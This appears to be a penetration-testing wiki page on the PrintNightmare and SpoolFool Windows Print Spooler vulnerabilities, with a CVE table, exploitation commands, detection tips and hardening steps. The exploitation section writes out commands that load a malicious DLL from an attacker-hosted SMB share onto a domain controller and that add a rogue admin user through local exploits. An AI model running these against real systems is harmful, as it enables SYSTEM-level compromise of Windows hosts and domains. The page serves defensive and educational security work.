# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare is the collective name given to a family of vulnerabilities in the Windows **Print Spooler** service that allow **arbitrary code execution as SYSTEM** and, when the spooler is reachable over RPC, **remote code execution (RCE) on domain controllers and file servers**. The most-widely exploited CVEs are **CVE-2021-1675** (initially classed as LPE) and **CVE-2021-34527** (full RCE). Subsequent issues such as **CVE-2021-34481 (“Point & Print”)** and **CVE-2022-21999 (“SpoolFool”)** prove that the attack surface is still far from closed.

---

## 1. Vulnerable components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Patched in June 2021 CU but bypassed by CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx allows authenticated users to load a driver DLL from a remote share|
|2021|CVE-2021-34481|“Point & Print”|LPE|Unsigned driver installation by non-admin users|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Arbitrary directory creation → DLL planting – works after 2021 patches|

All of them abuse one of the **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) or trust relationships inside **Point & Print**.

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

An authenticated but **non-privileged** domain user can run arbitrary DLLs as **NT AUTHORITY\SYSTEM** on a remote spooler (often the DC) by:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Popular PoCs include **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) and Benjamin Delpy’s `misc::printnightmare / lsa::addsid` modules in **mimikatz**.

### 2.2 Local privilege escalation (any supported Windows, 2021-2024)

The same API can be called **locally** to load a driver from `C:\Windows\System32\spool\drivers\x64\3\` and achieve SYSTEM privileges:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 SpoolFool (CVE-2022-21999) – bypassing 2021 fixes

Microsoft’s 2021 patches blocked remote driver loading but **did not harden directory permissions**. SpoolFool abuses the `SpoolDirectory` parameter to create an arbitrary directory under `C:\Windows\System32\spool\drivers\`, drops a payload DLL, and forces the spooler to load it:

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> The exploit works on fully-patched Windows 7 → Windows 11 and Server 2012R2 → 2022 before February 2022 updates 

---

## 3. Detection & hunting

* **Event Logs** – enable the *Microsoft-Windows-PrintService/Operational* and *Admin* channels and watch for **Event ID 808** “The print spooler failed to load a plug-in module” or for **RpcAddPrinterDriverEx** messages.
* **Sysmon** – `Event ID 7` (Image loaded) or `11/23` (File write/delete) inside `C:\Windows\System32\spool\drivers\*` when the parent process is **spoolsv.exe**.
* **Process lineage** – alerts whenever **spoolsv.exe** spawns `cmd.exe`, `rundll32.exe`, PowerShell or any unsigned binary .

## 4. Mitigation & hardening

1. **Patch!** – Apply the latest cumulative update on every Windows host that has the Print Spooler service installed.
2. **Disable the spooler where it is not required**, especially on Domain Controllers:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Block remote connections** while still allowing local printing – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Restrict Point & Print** so only administrators can add drivers by setting the registry value:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Detailed guidance in Microsoft KB5005652 

---

## 5. Related research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules  
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)  
* SpoolFool exploit & write-up  
* 0patch micropatches for SpoolFool and other spooler bugs  

---

**More reading (external):** Check the 2024 walk-through blog post – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)



## References

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*  
  <[https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*  
  <[https://github.com/ly4k/SpoolFool](https://github.com/ly4k/SpoolFool)>
{{#include ../../banners/hacktricks-training.md}}
